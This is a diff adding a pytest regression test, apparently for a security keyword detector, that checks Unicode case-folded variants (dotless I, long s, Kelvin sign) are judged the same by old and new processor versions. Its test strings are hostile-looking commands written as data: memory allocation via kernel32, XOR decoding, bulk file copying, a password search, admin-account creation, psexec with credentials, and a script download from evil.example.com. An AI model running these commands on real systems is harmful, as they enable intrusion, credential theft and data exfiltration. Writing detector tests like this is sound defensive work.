@@ -241,3 +241,36 @@ def test_worst_case_is_fast(processor, name):
         new(value)
         spent = time.process_time() - started
         assert spent < BUDGET, f"{name} spent {spent:.2f}s CPU on a {len(value)}-char value"
+
+
+# Under re.IGNORECASE a pattern's i also matches dotless and dotted I, its s
+# the long s and its k the Kelvin sign; str.lower() maps none of them to
+# ASCII. A shortcut that tests a lowercased copy for a keyword must not
+# decide differently from the regex it stands in front of.
+_FOLDED = {"i": ["\u0131", "\u0130"], "s": ["\u017f"], "k": ["\u212a"]}
+_KEYWORD_VALUES = [
+    "Add-Type -TypeDefinition '[DllImport(\"kernel32.dll\")]' VirtualAlloc(0, 4096, 0x3000, 0x40)",
+    "$b = [byte[]](1..9); foreach ($x in $b) { $x -bxor 0x35 }; for ($i=0) { $b[$i] -bxor 55 }",
+    "cmd /c zip -r out.zip C:\\Users && xcopy /s C:\\a D:\\b && copy *.docx D:\\x && sqlcmd -S db -Q x",
+    "sqlite3 db .dump; dir /s *.pdf; findstr /s password *.key",
+    "net user admin P@ss /add; schtasks /create /U bob /P pw; wmic /user:x /password:y; psexec -u a -p b",
+    "iwr http://evil.example.com/a.ps1; resolve evil.info; 10.0.0.5",
+]
+
+
+def _folded_variants(value):
+    out = [value]
+    for ascii_char, folds in _FOLDED.items():
+        for fold in folds:
+            out.append(value.replace(ascii_char, fold))
+            out.append(value.replace(ascii_char.upper(), fold))
+    return out
+
+
+@pytest.mark.parametrize("name", sorted(CASES))
+def test_case_folded_keywords_decide_as_before(processor, name):
+    old = _func(processor, OLD_DIR / name)
+    new = _func(processor, NEW_DIR / name)
+    values = [v for value in _KEYWORD_VALUES for v in _folded_variants(value)]
+    differ = [(v, old(v), new(v)) for v in values if old(v) != new(v)]
+    assert differ == [], f"{name}: first differences {differ[:3]}"
